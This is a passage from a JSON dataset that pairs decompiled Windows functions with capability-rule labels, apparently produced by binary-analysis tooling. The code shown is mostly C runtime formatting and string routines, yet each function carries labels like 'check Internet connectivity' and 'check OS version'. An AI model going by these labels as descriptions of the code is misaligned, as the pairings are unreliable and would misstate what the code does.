param_1[0xb] = uVar7;\n            return 1;\n        }\n        puVar6 = fcn.00403a35();\n        *puVar6 = 0x16;\n        fcn.004037ce();\n        return 0;\n    }\n    if ((*param_1 & 8) != 0) {\n        return 1;\n    }\n    param_1[7] = 7;\n    cVar4 = *(param_1 + 0x31);\n    uStack8 = param_1;\n    if (cVar4 < 'e') {\n        if (cVar4 == 'd') {\ncode_r0x004a0e93:\n            param_1[8] = param_1[8] | 0x10;\ncode_r0x004a0e97:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x004a0e9a:\n            cVar4 = fcn.00401f73(arg_8h, arg_ch_00);\n        }\n        else if (cVar4 < 'Y') {\n            if (cVar4 == 'X') {\n                arg_ch_00 = 1;\ncode_r0x004a0e3f:\n                arg_8h = 0x10;\n                goto code_r0x004a0e9a;\n            }\n            if (cVar4 != 'A') {\n                if (cVar4 == 'C') goto code_r0x004a0e53;\n                if (cVar4 < 'E') {\n                    return 0;\n                }\n                if ('G' < cVar4) {\n                    if (cVar4 != 'S') {\n                        return 0;\n                    }\n                    goto code_r0x004a0e27;\n                }\n            }\ncode_r0x004a0ea3:\n            cVar4 = fcn.004059f2();\n        }\n        else if (cVar4 == 'Z') {\n            cVar4 = fcn.00406690();\n        }\n        else {\n            if (cVar4 == 'a') goto code_r0x004a0ea3;\n            if (cVar4 != 'c') {\n                return 0;\n            }\ncode_r0x004a0e53:\n            cVar4 = fcn.004033ff(0);\n        }\n    }\n    else if (cVar4 < 'q') {\n        if (cVar4 == 'p') {\n            cVar4 = fcn.004024c8();\n        }\n        else {\n            if (cVar4 < 'h') goto code_r0x004a0ea3;\n            if (cVar4 == 'i') goto code_r0x004a0e93;\n            if (cVar4 == 'n') {\n                cVar4 = fcn.00403d19();\n            }\n            else {\n                if (cVar4 != 'o') {\n                    return 0;\n                }\n                cVar4 = fcn.00405bd7();\n            }\n        }\n    }\n    else {\n        if (cVar4 != 's') {\n            if (cVar4 != 'u') {\n                if (cVar4 != 'x') {\n                    return 0;\n                }\n                arg_ch_00 = 0;\n                goto code_r0x004a0e3f;\n            }\n            goto code_r0x004a0e97;\n        }\ncode_r0x004a0e27:\n        cVar4 = fcn.004013e3();\n    }\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    cVar4 = fcn.00402153();\n    if (cVar4 != '\\0') {\n        return 1;\n    }\n    if (*(param_1 + 0xc) != '\\0') {\n        return 1;\n    }\n    arg_ch = 0;\n    uStack8 = (uStack8 >> 0x10 & 0xff00) << 0x10;\n    uVar7 = param_1[8];\n    iStack12 = 0;\n    if ((uVar7 >> 4 & 1) != 0) {\n        uStack8._1_3_ = uStack8 >> 8;\n        if ((uVar7 >> 6 & 1) == 0) {\n            if ((uVar7 & 1) == 0) {\n                if ((uVar7 >> 1 & 1) != 0) {\n                    uStack8 = CONCAT31(uStack8._1_3_, 0x20);\n                    arg_ch = 1;\n                    iStack12 = 1;\n                }\n                goto code_r0x004a0f38;\n            }\n            uStack8 = CONCAT31(uStack8._1_3_, 0x2b);\n        }\n        else {\n            uStack8 = CONCAT31(uStack8._1_3_, 0x2d);\n        }\n        iStack12 = 1;\n        arg_ch = 1;\n    }\ncode_r0x004a0f38:\n    cVar4 = *(param_1 + 0x31);\n    if (((cVar4 == 'x') || (cVar4 == 'X')) && ((uVar7 >> 5 & 1) != 0)) {\n        bVar2 = true;\n    }\n    else {\n        bVar2 = false;\n    }\n    if ((cVar4 == 'a') || (cVar4 == 'A')) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar2) || (bVar3)) {\n        *(&uStack8 + arg_ch) = 0x30;\n        if ((cVar4 == 'X') || (cVar4 == 'A')) {\n            uVar5 = 0x58;\n        }\n        else {\n            uVar5 = 0x78;\n        }\n        *(&uStack8 + arg_ch + 1) = uVar5;\n        arg_ch = arg_ch + 2;\n        iStack12 = arg_ch;\n    }\n    arg_14h = param_1 + 6;\n    arg_10h = (param_1[9] - param_1[0xe]) - arg_ch;\n    if ((*(param_1 + 8) & 0xc) == 0) {\n        fcn.00404039(param_1 + 0x112, 0x20, arg_10h, arg_14h);\n        arg_ch = iStack12;\n    }\n    fcn.0040549d(&uStack8, arg_ch, arg_14h);\n    if (((param_1[8] >> 3 & 1) != 0) && ((param_1[8] >> 2 & 1) == 0)) {\n        fcn.00404039(param_1 + 0x112, 0x30, arg_10h, arg_14h);\n    }\n    fcn.004020bd(0);\n    if ((-1 < *arg_14h) && ((param_1[8] >> 2 & 1) != 0)) {\n        fcn.00404039(param_1 + 0x112, 0x20, arg_10h, arg_14h);\n    }\n    return 1;\n}\n",
        "token_count": 2407
    },
    "00401edd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00401edd(void)\n\n{\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    for (var_18h = 9; 0 < var_18h; var_18h = var_18h + -1) {\n    }\n    for (var_1ch = 0xc; 0 < var_1ch; var_1ch = var_1ch + -1) {\n    }\n    for (var_20h = 0xb; 0 < var_20h; var_20h = var_20h + -1) {\n    }\n    for (var_24h = 0x48; 0 < var_24h; var_24h = var_24h + -1) {\n    }\n    return;\n}\n",
        "token_count": 224
    },
    "00401f2d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00401f2d(int32_t *param_1)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    \n    if ((*param_1[7] != NULL) && (0 < *param_1[0xb])) {\n        return **param_1[7];\n    }\n    pcVar1 = *(*param_1 + 0x18);\n    (**0x578000)();\n    uVar2 = (*pcVar1)();\n    return uVar2;\n}\n",
        "token_count": 114
    },
    "00401f50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nbool __cdecl fcn.00401f50(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    char cVar3;\n    uint32_t in_EAX;\n    uint32_t arg_10h_00;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_ECX;\n    char cVar6;\n    char cVar7;\n    uint var_1h;\n    \n    uVar1 = *(arg_8h + 1);\n    arg_10h_00 = in_EAX & 0xffffff00 | uVar1;\n    cVar2 = arg_10h;\n    if ((uVar1 == 0x70) || (cVar2 == 'p')) {\n        return (uVar1 == 0x70) != (cVar2 != 'p');\n    }\n    cVar3 = '\\0';\n    if ((uVar1 == 0x73) || (var_1h._0_1_ = '\\0',  uVar1 == 0x53)) {\n        var_1h._0_1_ = '\\x01';\n    }\n    if ((cVar2 == 's') || (cVar7 = cVar3,  cVar2 == 'S')) {\n        cVar7 = '\\x01';\n    }\n    if ((uVar1 == 99) || (cVar6 = cVar3,  uVar1 == 0x43)) {\n        cVar6 = '\\x01';\n    }\n    if ((cVar2 == 'c') || (cVar2 == 'C')) {\n        cVar3 = '\\x01';\n    }\n    if (var_1h == '\\0') {\n        if (cVar7 != '\\0') {\n            return false;\n        }\n        if (cVar6 == '\\0') {\n            if (cVar3 != '\\0') {\n                return false;\n            }\n            cVar2 = fcn.004058f8(arg_10h_00);\n            cVar3 = fcn.004058f8(arg_10h);\n            if (cVar2 == '\\0') {\n                if (cVar3 != '\\0') {\n                    return false;\n                }\n                return *arg_8h == arg_ch;\n            }\n            if (cVar2 != cVar3) {\n                return false;\n            }\n            if ((arg_8h[3] == 9) != (arg_14h == 9)) {\n                return false;\n            }\n            iVar4 = fcn.00402798(arg_8h[3]);\n            iVar5 = fcn.00402798(arg_14h);\n            return iVar4 == iVar5;\n        }\n    }\n    else if (var_1h != cVar7) {\n        return false;\n    }\n    if (cVar6 == cVar3) {\n        cVar2 = fcn.004047f5(*in_ECX, in_ECX[1], arg_10h_00, arg_8h[3]);\n        cVar3 = fcn.004047f5(*in_ECX, in_ECX[1], arg_10h, arg_14h);\n        if (cVar2 == cVar3) {\n            return true;\n        }\n    }\n    return false;\n}\n",
        "token_count": 767
    },
    "00401f78": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00401f78(int32_t *arg_8h, uchar *arg_ch, uint32_t arg_10h, uint32_t arg_14h, uint arg_18h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if ((arg_ch == NULL) && (arg_10h != 0)) {\n        if (arg_8h != NULL) {\n            *arg_8h = 0;\n        }\n        return 0;\n    }\n    if (arg_8h != NULL) {\n        *arg_8h = -1;\n    }\n    if (0x7fffffff < arg_10h) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n        return 0x16;\n    }\n    fcn.004058a8(arg_18h);\n    uVar3 = 0;\n    if (*(var_14h + 8) == 0xfde9) {\n        var_8h = 0;\n        var_4h = 0;\n        iVar2 = fcn.00401348(arg_ch, arg_14h & 0xffff, &var_8h);\n        if (arg_8h != NULL) {\n            *arg_8h = iVar2;\n        }\n        if (4 < iVar2) {\n            puVar1 = fcn.00403a35();\n            uVar3 = *puVar1;\n        }\n        goto code_r0x004c4aa0;\n    }\n    if (*(var_14h + 0xa8) == 0) {\n        if (arg_14h < 0x100) {\n            if (arg_ch != NULL) {\n                if (arg_10h == 0) goto code_r0x004c4b1c;\n                *arg_ch = arg_14h;\n            }\n            if (arg_8h != NULL) {\n                *arg_8h = 1;\n            }\n            goto code_r0x004c4aa0;\n        }\n        if ((arg_ch != NULL) && (arg_10h != 0)) {\n            fcn.00403189(arg_ch, 0, arg_10h);\n        }\n    }\n    else {\n        var_4h = 0;\n        iVar2 = fcn.0040664f(*(var_14h + 8), 0, &arg_14h, 1, arg_ch, arg_10h, 0, &var_4h);\n        if (iVar2 == 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar2 == 0x7a) {\n                if ((arg_ch != NULL) && (arg_10h != 0)) {\n                    fcn.00403189(arg_ch, 0, arg_10h);\n                }\ncode_r0x004c4b1c:\n                puVar1 = fcn.00403a35();\n                uVar3 = 0x22;\n                *puVar1 = 0x22;\n                fcn.004037ce();\n                goto code_r0x004c4aa0;\n            }\n        }\n        else if (var_4h == 0) {\n            if (arg_8h != NULL) {\n                *arg_8h = iVar2;\n            }\n            goto code_r0x004c4aa0;\n        }\n    }\n    puVar1 = fcn.00403a35();\n    uVar3 = 0x2a;\n    *puVar1 = 0x2a;\ncode_r0x004c4aa0:\n    if (var_ch != '\\0') {\n        *(var_18h + 0x350) = *(var_18h + 0x350) & 0xfffffffd;\n    }\n    return uVar3;\n}\n",
        "token_count": 910
    },
    "00401f91": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t * fcn.00401f91(uint32_t *param_1, char param_2)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    char *pcVar7;\n    uchar auVar8 [16];\n    char cVar10;\n    char cVar11;\n    char cVar12;\n    char cVar13;\n    char cVar14;\n    char cVar15;\n    char cVar16;\n    uchar auVar9 [16];\n    \n    if (*0x573c4c != 0) {\n        auVar9 = pshuflw(ZEXT216(CONCAT11(param_2, param_2)), ZEXT216(CONCAT11(param_2, param_2)), 0);\n        uVar3 = -1 << (param_1 & 0xf);\n        pcVar7 = param_1 - (param_1 & 0xf);\n        while( true ) {\n            cVar2 = SUB161(auVar9, 0);\n            cVar10 = SUB161(auVar9 >> 8, 0);\n            cVar11 = SUB161(auVar9 >> 0x10, 0);\n            cVar12 = SUB161(auVar9 >> 0x18, 0);\n            cVar13 = SUB161(auVar9 >> 0x20, 0);\n            cVar14 = SUB161(auVar9 >> 0x28, 0);\n            cVar15 = SUB161(auVar9 >> 0x30, 0);\n            cVar16 = SUB161(auVar9 >> 0x38, 0);\n            auVar8 = CONCAT115(-(pcVar7[0xf] == '\\0'), \n                               CONCAT114(-(pcVar7[0xe] == '\\0'), \n                                         CONCAT113(-(pcVar7[0xd] == '\\0'), \n                                                   CONCAT112(-(pcVar7[0xc] == '\\0'), \n                                                             CONCAT111(-(pcVar7[0xb] == '\\0'), \n                                                                       CONCAT110(-(pcVar7[10] == '\\0'), \n                                                                                 CONCAT19(-(pcVar7[9] == '\\0'), \n                                                                                          CONCAT18(-(pcVar7[8] == '\\0')\n                                                                                                   , CONCAT17(-(pcVar7[7\n                                                            ] == '\\0'), \n                                                            CONCAT16(-(pcVar7[6] == '\\0'), \n                                                                     CONCAT15(-(pcVar7[5] == '\\0'), \n                                                                              CONCAT14(-(pcVar7[4] == '\\0'), \n                                                                                       CONCAT13(-(pcVar7[3] == '\\0'), \n                                                                                                CONCAT12(-(pcVar7[2] ==\n                                                                                                          '\\0'), \n                                                            CONCAT11(-(pcVar7[1] == '\\0'), -(*pcVar7 == '\\0'))))))))))))\n                                                            )))) |\n                     CONCAT115(-(pcVar7[0xf] == cVar16), \n                               CONCAT114(-(pcVar7[0xe] == cVar15), \n                                         CONCAT113(-(pcVar7[0xd] == cVar14), \n                                                   CONCAT112(-(pcVar7[0xc] == cVar13), \n                                                             CONCAT111(-(pcVar7[0xb] == cVar12), \n                                                                       CONCAT110(-(pcVar7[10] == cVar11), \n                                                                                 CONCAT19(-(pcVar7[9] == cVar10), \n                                                                                          CONCAT18(-(pcVar7[8] == cVar2)\n                                                                                                   , CONCAT17(-(pcVar7[7\n                                                            ] == cVar16), \n                                                            CONCAT16(-(pcVar7[6] == cVar15), \n                                                                     CONCAT15(-(pcVar7[5] == cVar14), \n                                                                              CONCAT14(-(pcVar7[4] == cVar13), \n                                                                                       CONCAT13(-(pcVar7[3] == cVar12), \n                                                                                                CONCAT12(-(pcVar7[2] ==\n                                                                                                          cVar11), \n                                                                                                         CONCAT11(-(\n                                                            pcVar7[1] == cVar10), -(*pcVar7 == cVar2))))))))))))))));\n            uVar3 = (SUB161(auVar8 >> 7, 0) & 1 | (SUB161(auVar8 >> 0xf, 0) & 1) << 1 |\n                     (SUB161(auVar8 >> 0x17, 0) & 1) << 2 | (SUB161(auVar8 >> 0x1f, 0) & 1) << 3 |\n                     (SUB161(auVar8 >> 0x27, 0) & 1) << 4 | (SUB161(auVar8 >> 0x2f, 0) & 1) << 5 |\n                     (SUB161(auVar8 >> 0x37, 0) & 1) << 6 | (SUB161(auVar8 >> 0x3f, 0) & 1) << 7 |\n                     (SUB161(auVar8 >> 0x47, 0) & 1) << 8 | (SUB161(auVar8 >> 0x4f, 0) & 1) << 9 |\n                     (SUB161(auVar8 >> 0x57, 0) & 1) << 10 | (SUB161(auVar8 >> 0x5f, 0) & 1) << 0xb |\n                     (SUB161(auVar8 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar8 >> 0x6f, 0) & 1) << 0xd |\n                     (SUB161(auVar8 >> 0x77, 0) & 1) << 0xe | SUB161(auVar8 >> 0x7f, 0) << 0xf) & uVar3;\n            if (uVar3 != 0) break;\n            uVar3 = 0xffffffff;\n            pcVar7 = pcVar7 + 0x10;\n        }\n        iVar1 = 0;\n        if (uVar3 != 0) {\n            for (; (uVar3 >> iVar1 & 1) == 0; iVar1 = iVar1 + 1) {\n            }\n        }\n        puVar4 = pcVar7 + iVar1;\n        if (cVar2 != *puVar4) {\n            puVar4 = NULL;\n        }\n        return puVar4;\n    }\n    uVar3 = param_1 & 3;\n    while (uVar3 != 0) {\n        if (*param_1 == param_2) {\n            return param_1;\n        }\n        if (*param_1 == '\\0') {\n            return NULL;\n        }\n        uVar3 = param_1 + 1 & 3;\n        param_1 = param_1 + 1;\n    }\n    while( true ) {\n        while( true ) {\n            uVar3 = *param_1;\n            uVar6 = uVar3 ^ CONCAT22(CONCAT11(param_2, param_2), CONCAT11(param_2, param_2));\n            uVar5 = uVar3 ^ 0xffffffff ^ uVar3 + 0x7efefeff;\n            puVar4 = param_1 + 1;\n            if (((uVar6 ^ 0xffffffff ^ uVar6 + 0x7efefeff) & 0x81010100) != 0) break;\n            param_1 = puVar4;\n            if ((uVar5 & 0x81010100) != 0) {\n                if ((uVar5 & 0x1010100) != 0) {\n                    return NULL;\n                }\n                if ((uVar3 + 0x7efefeff & 0x80000000) == 0) {\n                    return NULL;\n                }\n            }\n        }\n        uVar3 = *param_1;\n        if (uVar3 == param_2) {\n            return param_1;\n        }\n        if (uVar3 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar3 >> 8;\n        if (cVar2 == param_2) {\n            return param_1 + 1;\n        }\n        if (cVar2 == '\\0') break;\n        cVar2 = uVar3 >> 0x10;\n        if (cVar2 == param_2) {\n            return param_1 + 2;\n        }\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar3 >> 0x18;\n        if (cVar2 == param_2) {\n            return param_1 + 3;\n        }\n        param_1 = puVar4;\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 1965
    },
    "00401fc8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00401fc8(int32_t param_1)\n\n{\n    uchar uVar1;\n    char cVar2;\n    \n    if (*(param_1 + 0x31) != '*') {\n        uVar1 = fcn.004055e2(param_1 + 0x28);\n        return uVar1;\n    }\n    cVar2 = fcn.00401c17();\n    if (cVar2 == '\\0') {\n        return 0;\n    }\n    cVar2 = fcn.004051cd();\n    if ((cVar2 != '\\0') && (*(param_1 + 0x28) < 0)) {\n        *(param_1 + 0x28) = 0xffffffff;\n    }\n    return 1;\n}\n",
        "token_count": 170
    },
    "00401ffa": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401ffa(uint *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint uVar2;\n    uint uVar3;\n    \n    *0x575064 = *0x575064 + 1;\n    uVar3 = 0x1000;\n    uVar2 = fcn.00405088(0x1000, 1);\n    arg_8h[1] = uVar2;\n    fcn.0040640b(0);\n    puVar1 = arg_8h + 3;\n    if (arg_8h[1] == 0) {\n        LOCK();\n        *puVar1 = *puVar1 | 0x400;\n        arg_8h[1] = arg_8h + 5;\n        uVar3 = 2;\n    }\n    else {\n        LOCK();\n        *puVar1 = *puVar1 | 0x40;\n    }\n    arg_8h[6] = uVar3;\n    arg_8h[2] = 0;\n    *arg_8h = arg_8h[1];\n    return;\n}\n",
        "token_count": 252
    },
    "0040200e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.0040200e(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if ((arg_ch != 0) && (arg_10h != 0)) {\n        if (arg_14h != 0) {\n            var_1ch = &arg_14h;\n            var_8h = arg_14h;\n            var_18h = &arg_8h;\n            var_ch = arg_14h;\n            var_14h = &arg_ch;\n            var_10h = &arg_10h;\n            uVar2 = fcn.004b0fd8(&var_ch, &var_1ch);\n            return uVar2;\n        }\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n    }\n    return 0;\n}\n",
        "token_count": 294
    },
    "00402013": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00402013(uint32_t *param_1)\n\n{\n    uint32_t *arg_8h;\n    int16_t iVar1;\n    uint16_t *puVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint unaff_ESI;\n    ushort uVar8;\n    uint16_t uVar9;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    int32_t iStack20;\n    uint uStack16;\n    ushort uStack12;\n    uint16_t *puStack8;\n    \n    uVar9 = *(param_1 + 0x32);\n    puStack8 = uVar9;\n    if (puStack8 != 0x46) {\n        if (puStack8 == 0x4e) {\n            puStack8 = *param_1 & 8;\n            if (puStack8 != NULL) goto code_r0x004a0274;\n            param_1[7] = 8;\ncode_r0x004a013f:\n            puStack8 = 0x4a0144;\n            puVar6 = fcn.00403a35();\n            *puVar6 = 0x16;\n            puStack8 = 0x4a014f;\n            uVar7 = fcn.004037ce();\n            return uVar7 & 0xffffff00;\n        }\n        if (param_1[0xb] != 0) goto code_r0x004a013f;\n        if (uVar9 < 0x6b) {\n            if (uVar9 == 0x6a) {\n                param_1[0xb] = 5;\n                goto code_r0x004a0274;\n            }\n            if (puStack8 == 0x49) {\n                puVar2 = param_1[4];\n                puStack8 = *puVar2;\n                if ((puStack8 == 0x33) && (puVar2[1] == 0x32)) {\n                    puStack8 = puVar2 + 2;\n                    param_1[0xb] = 10;\n                    param_1[4] = puStack8;\n                }\n                else if ((puStack8 == 0x36) && (puVar2[1] == 0x34)) {\n                    puStack8 = puVar2 + 2;\n                    param_1[0xb] = 0xb;\n                    param_1[4] = puStack8;\n                }\n                else if (((((puStack8 == 0x64) || (puStack8 == 0x69)) || (puStack8 == 0x6f)) ||\n                         ((puStack8 == 0x75 || (puStack8 == 0x78)))) || (puStack8 == 0x58)) {\n                    param_1[0xb] = 9;\n                }\n                goto code_r0x004a0274;\n            }\n            if (puStack8 == 0x4c) {\n                param_1[0xb] = 8;\n                goto code_r0x004a0274;\n            }\n            if (puStack8 == 0x54) {\n                param_1[0xb] = 0xd;\n                goto code_r0x004a0274;\n            }\n            if (uVar9 != 0x68) goto code_r0x004a0274;\n            if (*param_1[4] == 0x68) {\n                param_1[4] = param_1[4] + 1;\n                puStack8 = 0x1;\n            }\n            else {\n                puStack8 = 0x2;\n            }\n        }\n        else {\n            if (uVar9 != 0x6c) {\n                if (puStack8 == 0x74) {\n                    param_1[0xb] = 7;\n                }\n                else if (puStack8 == 0x77) {\n                    param_1[0xb] = 0xc;\n                }\n                else if (puStack8 == 0x7a) {\n                    param_1[0xb] = 6;\n                }\n                goto code_r0x004a0274;\n            }\n            if (*param_1[4] == 0x6c) {\n                param_1[4] = param_1[4] + 1;\n                puStack8 = 0x4;\n            }\n            else {\n                puStack8 = 0x3;\n            }\n        }\n        param_1[0xb] = puStack8;\ncode_r0x004a0274:\n        return CONCAT31(puStack8 >> 8, 1);\n    }\n    puStack8 = *param_1 & 8;\n    if (puStack8 != NULL) goto code_r0x004a0274;\n    param_1[7] = 7;\n    puStack8 = *0x571ca8 ^ &stack0xfffffffc;\n    uVar9 = *(param_1 + 0x32);\n    if (uVar9 < 0x65) {\n        if (uVar9 == 100) {\ncode_r0x004a2319:\n            param_1[8] = param_1[8] | 0x10;\ncode_r0x004a231d:\n            arg_ch_00 = 0;\n            arg_8h_00 = 10;\ncode_r0x004a2320:\n            cVar5 = fcn.0040157d(arg_8h_00, arg_ch_00);\n        }\n        else if (uVar9 < 0x59) {\n            if (uVar9 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x004a22c5:\n                arg_8h_00 = 0x10;\n                goto code_r0x004a2320;\n            }\n            if (uVar9 != 0x41) {\n                if (uVar9 == 0x43) goto code_r0x004a22d9;\n                if (uVar9 < 0x45) goto code_r0x004a24a9;\n                if (0x47 < uVar9) {\n                    if (uVar9 != 0x53) goto code_r0x004a24a9;\n                    goto code_r0x004a22ad;\n                }\n            }\ncode_r0x004a2329:\n            cVar5 = fcn.004051eb();\n        }\n        else if (uVar9 == 0x5a) {\n            cVar5 = fcn.00402905();\n        }\n        else {\n            if (uVar9 == 0x61) goto code_r0x004a2329;\n            if (uVar9 != 99) goto code_r0x004a24a9;\ncode_r0x004a22d9:\n            cVar5 = fcn.004065ff(0);\n        }\n    }\n    else if (uVar9 < 0x71) {\n        if (uVar9 == 0x70) {\n            cVar5 = fcn.004023dd();\n        }\n        else {\n            if (uVar9 < 0x68) goto code_r0x004a2329;\n            if (uVar9 == 0x69) goto code_r0x004a2319;\n            if (uVar9 == 0x6e) {\n                cVar5 = fcn.004064d8();\n            }\n            else {\n                if (uVar9 != 0x6f) goto code_r0x004a24a9;\n                cVar5 = fcn.00401e56();\n            }\n        }\n    }\n    else {\n        if (uVar9 != 0x73) {\n            if (uVar9 != 0x75) {\n                if (uVar9 != 0x78) goto code_r0x004a24a9;\n                arg_ch_00 = 0;\n                goto code_r0x004a22c5;\n            }\n            goto code_r0x004a231d;\n        }\ncode_r0x004a22ad:\n        cVar5 = fcn.00401875();\n    }\n    if ((cVar5 == '\\0') || (*(param_1 + 0xc) != '\\0')) goto code_r0x004a24a9;\n    arg_ch = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uVar7 = param_1[8];\n    iStack20 = 0;\n    if ((uVar7 >> 4 & 1) != 0) {\n        if ((uVar7 >> 6 & 1) == 0) {\n            if ((uVar7 & 1) == 0) {\n                if ((uVar7 >> 1 & 1) != 0) {\n                    uStack16 = 0x20;\n                    arg_ch = 1;\n                    iStack20 = 1;\n                }\n                goto code_r0x004a23b4;\n            }\n            uVar9 = 0x2b;\n        }\n        else {\n            uVar9 = 0x2d;\n        }\n        uStack16 = uVar9;\n        iStack20 = 1;\n        arg_ch = 1;\n    }\ncode_r0x004a23b4:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar7 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&stack0xfffffff0 + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (uVar8 = 0x78,  iVar1 == 0x41)) {\n            uVar8 = 0x58;\n        }\n        *(&stack0xfffffff2 + arg_ch * 2) = uVar8;\n        arg_ch = arg_ch + 2;\n        iStack20 = arg_ch;\n    }\n    arg_8h = param_1 + 0x112;\n    arg_10h = (param_1[9] - param_1[0xe]) - arg_ch;\n    if ((*(param_1 + 8) & 0xc) == 0) {\n        fcn.00403fbc(arg_8h, 0x20, arg_10h, param_1 + 6);\n        arg_ch = iStack20;\n    }\n    fcn.00402978(&stack0xfffffff0, arg_ch, param_1 + 6);\n    if (((param_1[8] >> 3 & 1) != 0) && ((param_1[8] >> 2 & 1) == 0)) {\n        fcn.00403fbc(arg_8h, 0x30, arg_10h, param_1 + 6);\n    }\n    fcn.00403945(0);\n    if ((-1 < param_1[6]) && ((param_1[8] >> 2 & 1) != 0)) {\n        fcn.00403fbc(arg_8h, 0x20, arg_10h, param_1 + 6);\n    }\ncode_r0x004a24a9:\n    uVar7 = fcn.004030bc(unaff_ESI);\n    return uVar7;\n}\n",
        "token_count": 2628
    },
    "0040202c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
